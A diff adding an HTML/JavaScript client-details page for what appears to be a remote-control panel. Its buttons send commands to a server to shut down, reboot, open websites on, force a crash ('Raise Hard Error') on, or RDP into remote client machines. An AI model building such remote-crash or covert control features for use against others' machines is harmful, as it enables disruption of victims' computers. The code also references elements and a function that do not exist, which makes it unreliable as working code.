@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Client Details</title>
+  <link rel="stylesheet" href="/client.css">
+</head>
+<body>
+  <video class="background-video" autoplay loop muted poster="https://i.pinimg.com/originals/9d/37/a8/9d37a8ab76ebc8086da37442fc815b7a.gif">
+      <source src="https://www.dropbox.com/scl/fi/84676c8ua1ltv0wk6eiz4/Green-Hacker-Binary-Code-Animation.mp4?rlkey=h2hcbpuv2qypsz8jkstd0mvno&st=id6u3j15&dl=1" type="video/mp4">
+  </video>
+  <div id="client-details-container">
+    <h1>Client Details</h1>
+    <p><strong>Client ID:</strong> <span id="client-id"></span></p>
+    <p><strong>Friendly Name:</strong> <span id="friendly-name"></span></p>
+
+    <!-- Friendly Name Update -->
+    <input type="text" id="new-friendly-name" placeholder="Enter new friendly name">
+    <button onclick="updateFriendlyName()">Update Friendly Name</button>
+
+    <!-- Actieknoppen -->
+    <button onclick="shutdown()">Shutdown</button>
+    <button onclick="reboot()">Reboot</button>
+    <button onclick="openWebsite()">Open Website</button>
+    <button onclick="deleteClient()">Delete Client</button>
+    <button onclick="raiseHardError()">Raise Hard Error</button>
+    <button onclick="connectRDC()">Verbinden met Remote Desktop</button>
+  </div>
+
+  <script>
+    const clientId = window.location.pathname.split('/').pop();
+
+    function loadClientDetails() {
+      fetch(`/clients/${clientId}`)
+      .then(response => response.json())
+      .then(client => {
+        document.getElementById('client-id').innerText = client.clientId;
+        document.getElementById('friendly-name').innerText = client.friendlyName || "Not set";
+      })
+      .catch(error => console.error('Error fetching client details:', error));
+    }
+
+    function updateFriendlyName() {
+      const newName = document.getElementById('new-friendly-name').value;
+      fetch(`/clients/${clientId}/friendlyname`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ friendlyName: newName })
+      })
+      .then(response => response.json())
+      .then(() => {
+        alert('Friendly name updated!');
+        document.getElementById('friendly-name').innerText = newName;
+      })
+      .catch(error => console.error('Error updating friendly name:', error));
+    }
+
+    function shutdown() {
+      fetch(`/clients/${clientId}/shutdown`, { method: 'POST' })
+      .then(response => response.json())
+      .then(() => alert('Shutdown command executed'))
+      .catch(error => console.error('Error:', error));
+    }
+
+    function reboot() {
+      fetch(`/clients/${clientId}/reboot`, { method: 'POST' })
+      .then(response => response.json())
+      .then(() => alert('Reboot command executed'))
+      .catch(error => console.error('Error:', error));
+    }
+
+function openWebsite() {
+  const clientId = document.getElementById('client-id').innerText;
+  const customUrl = document.getElementById('custom-website-url').value;
+
+  if (!customUrl.startsWith('http')) {
+    alert('Please enter a valid URL (starting with http or https)');
+    return;
+  }
+
+  fetch(`/clients/${clientId}/openwebsite`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ url: customUrl })
+  })
+  .then(response => response.json())
+  .then(() => alert(`Opening website: ${customUrl}`))
+  .catch(error => console.error('Error opening website:', error));
+}
+
+
+    function deleteClient() {
+      fetch(`/clients/${clientId}`, { method: 'DELETE' })
+      .then(response => response.json())
+      .then(() => {
+        alert('Client verwijderd');
+        window.location.href = '/'; // Terug naar de clientlijst
+      })
+      .catch(error => console.error('Error:', error));
+    }
+
+    function raiseHardError() {
+      fetch(`/clients/${clientId}/raiseHardError`, { method: 'POST' })
+      .then(response => response.json())
+      .then(() => alert('Hard error raised'))
+      .catch(error => console.error('Error:', error));
+    }
+
+    loadClientDetails();
+    
+    async function loadClients() {
+    let response = await fetch("/get-clients");
+    let clients = await response.json();
+
+    let clientList = document.getElementById("client-list");
+    clientList.innerHTML = "";
+
+    Object.keys(clients).forEach(ip => {
+        let button = document.createElement("button");
+        button.innerText = `Verbinden met ${ip}`;
+        button.onclick = () => window.location.href = `mstsc:///${ip}`;
+        clientList.appendChild(button);
+    });
+}
+
+loadClients();
+
+  </script>
+</body>
+</html>
